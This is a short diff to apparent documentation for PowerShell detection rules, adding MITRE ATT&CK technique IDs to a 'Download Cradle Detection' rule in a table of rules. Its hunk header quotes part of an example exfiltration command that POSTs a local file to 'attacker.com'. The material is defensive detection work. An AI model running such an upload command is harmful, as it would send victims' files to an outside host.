@@ -807,7 +807,7 @@ Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile "C:\Tem
 | Rule | Name | MITRE ATT&CK | Severity | Detection Count |
 |------|------|--------------|----------|-----------------|
 | 47 | PowerShell Obfuscation Detection | T1027, T1027.010, T1059.001 | Critical | 7 patterns |
-| 48 | Download Cradle Detection | T1105, T1059.001, T1204.002, T1620 | Critical | 5 patterns |
+| 48 | Download Cradle Detection | T1105, T1059.001, T1204.002, T1027.004, T1620, T1197 | Critical | 5 patterns |
 | 49 | Persistence Mechanism Detection | T1547.001, T1053.005, T1546.003, T1546.013 | Critical | 6 patterns |
 | 50 | Credential Harvesting Detection | T1003.001, T1003.002, T1555.003, T1555.004 | Critical | 6 patterns |
 | 51 | Lateral Movement Detection | T1021.006, T1021.002, T1047, T1135, T1550.002 | Critical | 8 patterns |
